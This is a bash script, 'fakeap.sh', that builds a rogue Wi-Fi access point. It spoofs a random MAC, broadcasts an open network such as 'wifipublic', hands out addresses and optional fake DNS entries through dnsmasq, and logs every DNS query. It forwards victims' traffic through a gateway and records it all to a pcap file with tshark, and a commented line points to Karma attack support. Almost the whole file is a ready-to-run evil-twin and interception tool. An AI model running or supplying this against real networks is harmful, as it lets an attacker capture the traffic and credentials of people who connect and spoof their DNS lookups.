#!/usr/bin/env bash

# Default VARS
FAKEAP_HOME="${HOME}/.fakeap"
# SET VARS
FAKEAP_INTERFACE="${FAKEAP_INTERFACE}"
FAKEAP_ESSID="${FAKEAP_ESSID}"
FAKEAP_KILL="${FAKEAP_KILL}" || FAKEAP_KILL=""
FAKEAP_GATEWAY="${FAKEAP_GATEWAY}"
FAKEAP_RANGEIP="${FAKEAP_RANGEIP}"
FAKEAP_CHANNEL="${FAKEAP_CHANNEL}"
FAKEAP_MAC="${FAKEAP_MAC}"
FAKEAP_PROGRAM="${FAKEAP_PROGRAM}"
FAKEAP_TERMINAL="${FAKEAP_TERMINAL}"
FAKEAP_DHCP="${FAKEAP_DHCP}"
FAKEAP_FAKEDNS="${FAKEAP_FAKEDNS}"
FAKEAP_SILENCE="${FAKEAP_SILENCE}"

COLOR_GREEN='\033[0m'
COLOR_RED='\033[0;31m'
NC='\033[0m' # No Color

_MAN() {
echo -e "
${COLOR_GREEN}Run with variables, eg:${NC}
  Start:
    FAKEAP_INTERFACE=\"wlan0\" FAKEAP_ESSID=\"wifipublic\" ./fakeap.sh
    or
    FAKEAP_INTERFACE=\"wlan0\" FAKEAP_ESSID=\"wifipublic\" FAKEAP_GATEWAY=\"eth0\" ./fakeap.sh
  Stop:
    FAKEAP_KILL=1 FAKEAP_INTERFACE=wlan0 ./fakeap.sh

${COLOR_RED}REQUIRED: ${NC}
${COLOR_GREEN}Wireless to fakeap ${NC}
    FAKEAP_INTERFACE=\"wlan0\" - default: none

${COLOR_GREEN}Fakeap ESSID ${NC}
    FAKEAP_ESSID=\"wifipublic\" - default: none

${COLOR_RED}ACTIONS: ${NC}
${COLOR_GREEN}Stop fakeap, recommended to combine FAKEAP_INTERFACE var. ${NC}
    FAKEAP_KILL=\"1\" - default: none

${COLOR_RED}OPTIONALS: ${NC}
${COLOR_GREEN}Gateway for fakeap ${NC}
    FAKEAP_GATEWAY=\"eth0\" - default: none

${COLOR_GREEN}Range IP, dont put full address ${NC}
    FAKEAP_RANGEIP=\"172.16.99\" - default: 172.16.66

${COLOR_GREEN}Wireless fakeap channel ${NC}
    FAKEAP_CHANNEL=\"9\" - default: 6

${COLOR_GREEN}Fakeap wireless mac address ${NC}
    FAKEAP_MAC=\"01:23:45:67:89:ab\" - default: random using macchanger

${COLOR_GREEN}Program to run fakeap ${NC}
    FAKEAP_PROGRAM=\"aircrack\" - default: fakeapd

${COLOR_GREEN}Use external terminal with results ${NC}
    FAKEAP_TERMINAL=\"1\" - default: none

${COLOR_GREEN}Program to run dhcp server ${NC}
    FAKEAP_DHCP=\"dhcpcd\" - default: dnsmasq

${COLOR_GREEN}FakeDNS to fakeap ${NC}
    FAKEAP_FAKEDNS=\"~/fakedns.conf\" - default: none

${COLOR_GREEN}Put 0 to verbose mode ${NC}
    FAKEAP_SILENCE=\"0\" - default: 1

${COLOR_GREEN}Limit band on fakeap, recommended to 3G internet, put UP DOWN values in Kbit/s ${NC}
    FAKEAP_BANDWIDTH=\"500 100\" - default: none
"
}

# Action Kill
if [ "${FAKEAP_KILL}" == "1" ]; then
  kill -9 $(ps -ef | grep '\.fakeap' | grep -v grep | awk '{ print $2 }')
  [ ! -z "${FAKEAP_INTERFACE}" ] && wondershaper clear ${FAKEAP_INTERFACE} \
    && ifconfig ${FAKEAP_INTERFACE} down && ifconfig ${FAKEAP_INTERFACE} up
  systemctl restart network-manager
  tc qdisc del dev ${FAKEAP_INTERFACE} root
  iptables-restore < "${FAKEAP_HOME}/fakeap-iptables-save"

  kill -9 $(ps -ef | grep 'fakeap.sh' | grep -v grep | awk '{ print $2 }')
  exit 1
fi

set -euo pipefail

mkdir -p "${FAKEAP_HOME}"

_FAKEAP_START() {
  # CHECK VARS
  [ -z "${FAKEAP_RANGEIP}" ] && FAKEAP_RANGEIP="172.16.66"
  [ -z "${FAKEAP_CHANNEL}" ] && FAKEAP_CHANNEL="6"
  [ -z "${FAKEAP_MAC}" ] && FAKEAP_MAC="$(ifconfig ${FAKEAP_INTERFACE} down && macchanger --random ${FAKEAP_INTERFACE} && ifconfig ${FAKEAP_INTERFACE} up)"
  [ -z "${FAKEAP_PROGRAM}" ] && FAKEAP_PROGRAM="fakeapd"
  [ -z "${FAKEAP_DHCP}" ] && FAKEAP_DHCP="dnsmasq"
  [ -z "${FAKEAP_SILENCE}" ] && FAKEAP_SILENCE="1"

# Edit dnsmasq configuration
echo "
log-facility=${FAKEAP_HOME}/dnsmasq.log
#address=/#/${FAKEAP_RANGEIP}.1
#address=/google.com/${FAKEAP_RANGEIP}.1
interface=${FAKEAP_INTERFACE}
dhcp-range=${FAKEAP_RANGEIP}.10,${FAKEAP_RANGEIP}.100,8h
dhcp-option=3,${FAKEAP_RANGEIP}.1
dhcp-option=6,${FAKEAP_RANGEIP}.1
server=8.8.8.8
dhcp-leasefile=${FAKEAP_HOME}/dnsmasq.leases
#no-resolv
log-queries
" > "${FAKEAP_HOME}/fakeap-dnsmasq.conf"

# Configure Hostapd
echo "
interface=${FAKEAP_INTERFACE}
hw_mode=g
channel=${FAKEAP_CHANNEL}
driver=nl80211
wmm_enabled=1

ssid=${FAKEAP_ESSID}
# Yes, we support the Karm attack.
#enable_ka
" > "${FAKEAP_HOME}/fakeap-hostapd.conf"

  airmon-ng check kill
  killall dnsmasq wpa_supplicant dhclient || true
  # Start dnsmasq
  dnsmasq -C "${FAKEAP_HOME}/fakeap-dnsmasq.conf" -H "${FAKEAP_FAKEDNS}" &
  #dnsmasq -C "${FAKEAP_HOME}/fakeap-dnsmasq.conf" &
  # FakeAP iptables rules
  ifconfig "${FAKEAP_INTERFACE}" up
  ifconfig "${FAKEAP_INTERFACE}" ${FAKEAP_RANGEIP}.1/24
  iptables -t nat -F
  iptables -F
  if [ ! -z "${FAKEAP_GATEWAY}" ]; then
    iptables -t nat -A POSTROUTING -o "${FAKEAP_GATEWAY}" -j MASQUERADE
    iptables -A FORWARD -i "${FAKEAP_INTERFACE}" -o "${FAKEAP_GATEWAY}" -j ACCEPT
  fi
  echo '1' > /proc/sys/net/ipv4/ip_forward
  # Limit Bandwidth
  if [ ! -z "${FAKEAP_BANDWIDTH}" ]; then
    wondershaper ${FAKEAP_INTERFACE} 500 100
#        wondershaper ${FAKEAP_INTERFACE} ${FAKEAP_BANDWIDTH}
#        tc qdisc add dev ${FAKEAP_INTERFACE} handle 1: root htb default 30
#        tc class add dev ${FAKEAP_INTERFACE} parent 1: classid 1:1 htb rate 1kbps
#        tc class add dev ${FAKEAP_INTERFACE} parent 1: classid 1:2 htb rate 1kbps
  fi
  # Start FakeAP
  hostapd "${FAKEAP_HOME}/fakeap-hostapd.conf" -B &
  # Sniff
  tshark -i "${FAKEAP_INTERFACE}"  -w "${FAKEAP_HOME}/fakeap-output.pcap"
}

# START HERE
if [ ! -z "${FAKEAP_INTERFACE}" ] || [ ! -z "${FAKEAP_ESSID}" ]; then
  iptables-save > "${FAKEAP_HOME}/fakeap-iptables-save"
  if [ "${FAKEAP_SILENCE}" == "1" ]; then
      _FAKEAP_START &> /dev/null &
  else
      _FAKEAP_START
  fi
else
  _MAN
fi
